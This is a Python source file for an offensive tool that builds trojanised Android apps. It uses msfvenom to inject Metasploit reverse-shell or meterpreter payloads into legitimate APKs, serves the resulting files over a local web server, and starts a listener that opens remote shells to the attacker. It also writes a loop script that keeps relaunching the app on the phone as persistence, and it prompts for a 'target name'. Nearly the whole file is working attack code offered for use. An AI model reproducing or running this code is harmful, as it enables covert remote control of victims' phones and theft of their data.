import subprocess
import os
import uuid
import sys
import requests
import shutil
import random
import xml.etree.ElementTree as ET
from mods.colors import *
from mods.args import *

apks_dir = 'mal_apks/'

def name():
	global target_name
	target_name = input(color.BLUE+"Target name: "+color.END)
	print('')

def get_pub():
    global pub_ip
    pub_ip = requests.get('https://icanhazip.com').content.decode().strip()
    

def getip(pub = True):
    height = 0
    global ip
    zen_list = []
    myip_dict = {}
    if pub:
        get_pub()
        myip_dict.update({'Public IP':pub_ip})
    cmd = subprocess.run(['ip', '-br', '-f', 'inet', 'a'], capture_output=True).stdout.decode()
    for line in cmd.splitlines():
        if line.split()[1] == "UP":
            myip_dict.update({line.split()[0]:line.split()[2]})
    boo = "TRUE"
    for x in myip_dict:
        height += 80
        upcomming = "["+x+"] "+myip_dict[x].split('/')[0]
        zen_list.append(boo)
        zen_list.append(upcomming)
        boo = "FALSE"
    zen_cmd = ['zenity', '--list', '--title=Set Host', '--width', '400', '--height', str(height), '--text=Your host IP?', '--radiolist', '--column', 'Choice', '--column', 'IP Address']
    zen_ip = subprocess.run(zen_cmd+zen_list, capture_output=True).stdout.decode()
    if len(zen_ip) > 5:
        ip = zen_ip.strip().split()[-1].split('/')[0]
        return ip
    else:
        sys.exit(color.RED+"No IP address was specified"+color.END)
        
def getport():
    global port
    zen_cmd = ['zenity', '--title=Set Port', '--width', '100', '--text=Your host port?', '--entry']
    zen_port = subprocess.run(zen_cmd, capture_output=True).stdout.decode()
    if len(zen_port) > 0 :
        port = zen_port.strip()
    else:
        sys.exit(color.RED+"No port number was specified"+color.END)

def getpayloadtype():
    global payload_type
    zen_cmd = ['zenity', '--list', '--title=Set Payload', '--width', '400', '--height', '345', '--text=Choose payload', '--radiolist', '--column', 'Choice', '--column', 'Payload Type', 'TRUE', 'android/shell/reverse_tcp', 'FALSE', 'android/shell/reverse_http', 'FALSE', 'android/shell/reverse_https', 'FALSE', 'android/meterpreter/reverse_tcp', 'FALSE', 'android/meterpreter/reverse_http', 'FALSE', 'android/meterpreter/reverse_https', 'FALSE', 'android/meterpreter_reverse_tcp', 'FALSE', 'android/meterpreter_reverse_http', 'FALSE', 'android/meterpreter_reverse_https']
    zen_payload = subprocess.run(zen_cmd, capture_output=True).stdout.decode()
    if len(zen_payload) > 0:
        payload_type = zen_payload.strip()
    else:
        sys.exit(color.RED+"No payload type was specified"+color.END)

def direct_venom():
    global lport, lhost, lpayload, f_apk
    print(color.GREEN+"[+] Generating malicious APK"+color.END, end = "\n")
    os.makedirs(apks_dir, exist_ok=True)
    f_apk = os.path.splitext(apk.split('/')[-1])[0]+str(random.randint(1,999))+os.path.splitext(apk.split('/')[-1])[1]
    apk_out = os.path.join(apks_dir, f_apk)
    lhost = "LHOST="+ip.split("/")[0]
    lport = "LPORT="+port
    lpayload = payload_type
    try:
        subprocess.check_output(['msfvenom', '-x', apk, '-p', lpayload, lhost, lport, '-a', 'dalvik', '--platform', 'android', 'R', '-o', apk_out])
    except subprocess.CalledProcessError:
        sys.exit(color.RED+"\n[-] Exiting due to errors..."+color.END)
	
def start_msf():
    global working_msf_dir
    zen_cmd = 'zenity --question --title="Metasploit" --width 150 --text="Start Metasploit?"'
    zen_msf = subprocess.call(zen_cmd, shell=True)
    if zen_msf:
        sys.exit(color.YELLOW+"\n[*] Exiting..."+color.END)
    else:
        working_msf_dir = os.path.join('msf_dirs', target_name, f_apk.split('.')[0])
        os.makedirs(working_msf_dir, exist_ok=True)
        persis()
        os.chdir(working_msf_dir)
        if ip[:3] == "10." or ip[:7] == "172.16." or ip[:7] == "172.31." or ip[:8] == "192.168.":
            msf_ip = ip
        else:
            msf_ip = getip(pub=False)
        print("\n"+color.GREEN+"[+] Starting metasploit..."+color.END, end = "\n")
        subprocess.Popen(['xterm', '-geometry', '80x24+0+0', '-hold', '-fa', 'monaco', '-fs', '10', '-bg', 'black', '-e', 'msfconsole', '-q', '-x', "use multi/handler; set lhost "+msf_ip+"; set lport "+port+"; set payload "+payload_type+"; exploit"])
        os.chdir('..')

def start_srv():
    if ip[:3] == "10." or ip[:7] == "172.16." or ip[:7] == "172.31." or ip[:8] == "192.168.":
        zen_cmd = 'zenity --question --title="Local Server" --width 150 --text="Start Local Server?"'
        zen_srv = subprocess.call(zen_cmd, shell=True)
        if not zen_srv:
            prt_cmd = ['zenity', '--title=Set Port', '--width', '100', '--text=Local server port?', '--entry']
            prt_port = subprocess.run(prt_cmd, capture_output=True).stdout.decode()
            if len(prt_port) > 0 :
                prt = prt_port.strip()
                print(color.GREEN+"\n[+] Starting local server..."+color.END, end = "\n")
                subprocess.Popen(['xterm', '-T', 'Simple HTTP Server', '-geometry', '50x24-0+0', '-hold', '-fa', 'monaco', '-fs', '10', '-bg', 'black', '-e', 'python3', '-m', 'http.server', '-d' , apks_dir ,'-b', ip, prt])
            else:
                sys.exit(color.RED+"No port number was specified"+color.END)
   
def fetch_names():
    global pers_name
    
    tmp_dir = str(uuid.uuid4())
    tmp_dir_out = os.path.join('/tmp', 'decomp_payloads', tmp_dir)
    print(color.GREEN+"\n[+] Fetching info from AndroidManifest.xml and generating persistence script..."+color.END)
    subprocess.run(['apktool', 'd', '-f', apk, '-o', tmp_dir_out], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    man = os.path.join(tmp_dir_out, 'AndroidManifest.xml')
    tree = ET.parse(man)
    tree_root = tree.getroot()
    gotit = False
    pack_name = tree_root.attrib['package']
    for x in tree_root.findall('application'):
        act = x.findall("activity")
        for y in act:
            inten = y.findall("intent-filter")
            for x in inten:
                test = x.findall('action')
                for x in test:
                    cat = x.attrib
                    for x in cat.values():
                        if 'android.intent.action.MAIN' in x:
                            gotcha=y.attrib
                            for elem in gotcha:
                                if 'name' in elem and not gotit:
                                    int_app_name = gotcha[elem]
                                    gotit = True
                                    break
    
    pers_name = os.path.join(pack_name, int_app_name)
   
                
def persis():
    fetch_names()
    with open(os.path.join(working_msf_dir, '.sh'), 'w') as f:
        f.write("""
#!/bin/sh
while true
do am start --user 0 -a android.intent.action.MAIN -n """+pers_name+"""
    sleep 20
done
                """)
        print(color.BLUE+"[+] Persistence script saved to "+os.path.join(working_msf_dir ,str(f.name))+color.END)
        
        

# Manual

def venom():
	global payload
	print(color.GREEN+"[+] Generating payload..."+color.END, end = "\n")
	fi = str(uuid.uuid4())+'.apk'
	os.makedirs('temp/payloads', exist_ok=True)
	payload = os.path.join('temp', 'payloads', fi)
	lhost = "LHOST="+ip.split("/")[0]
	lport = "LPORT="+port
	lpayload = payload_type
	cmd = subprocess.Popen(['msfvenom', '-p', lpayload, lhost, lport, 'R', '-o', payload], stdout=subprocess.PIPE)
	for c in iter(lambda: cmd.stdout.read(1), b''):
		sys.stdout.write(c)
	print('')

def decomp(file):
	global dir_out, or_dir, pay_dir
	if file == apk:
		print(color.GREEN+"[+] Decompiling apk..."+color.END, end = "\n")
		dir = str(uuid.uuid4())
		dir_out = os.path.join('/tmp', 'decomp_originals', dir)
		or_dir = dir_out
	elif file == payload:
		print(color.GREEN+"[+] Decompiling payload..."+color.END, end = "\n")
		dir = str(uuid.uuid4())
		dir_out = os.path.join('/tmp', 'decomp_payloads', dir)
		pay_dir = dir_out
	cmd = subprocess.Popen(['apktool', 'd', '-f', file, '-o', dir_out], stdout=subprocess.PIPE)
	for c in iter(lambda: cmd.stdout.read(1), b''):
		sys.stdout.write(c.decode('utf-8'))
	print('')

def app_name():
	man = os.path.join(or_dir, 'AndroidManifest.xml')
	tree = ET.parse(man)
	tree_root = tree.getroot()

	gotit = False
	for x in tree_root.findall('application'):
		app = x.attrib
		for elem in app:
			if 'name' in elem and not gotit:
				app_name = app[elem]
				gotit = True
				break
			else:
				continue
		act = x.findall("activity")
		for y in act:
			inten = y.findall("intent-filter")
			for x in inten:
				test = x.findall('category')
				for x in test:
					cat = x.attrib
					for x in cat.values():
						if '.LAUNCHER' in x:
							gotcha=y.attrib
							for elem in gotcha:
								if 'name' in elem and not gotit:
									app_name = gotcha[elem]
									gotit = True
									break
	return app_name

def manual_embed():
	stage_dir = os.path.join(or_dir, 'smali', 'com', 'metasploit', 'stage')
	os.makedirs(stage_dir, exist_ok=True)

	pay_smali = os.path.join(pay_dir, 'smali', 'com', 'metasploit', 'stage', 'Payload.smali')
	shutil.copy(pay_smali, stage_dir)

	inj_path = '/'.join(app_name().split('.'))

	print(inj_path)


def recomp(directory):
	global apk_out, f_apk
	print(color.GREEN+"[+] Recompiling malicious apk..."+color.END, end = "\n")
	os.makedirs(apks_dir, exist_ok=True)
	f_apk = os.path.splitext(apk.split('/')[-1])[0]+str(random.randint(1,999))+os.path.splitext(apk.split('/')[-1])[1]
	apk_out = os.path.join(apks_dir, f_apk)
	cmd = subprocess.Popen(['apktool', 'b', directory, '-o', apk_out], stdout=subprocess.PIPE)
	for c in iter(lambda: cmd.stdout.read(1), b''):
		sys.stdout.write(c.decode('utf-8'))
	print(color.BLUE+"[*] Malicious APK saved to "+apk_out+color.END)
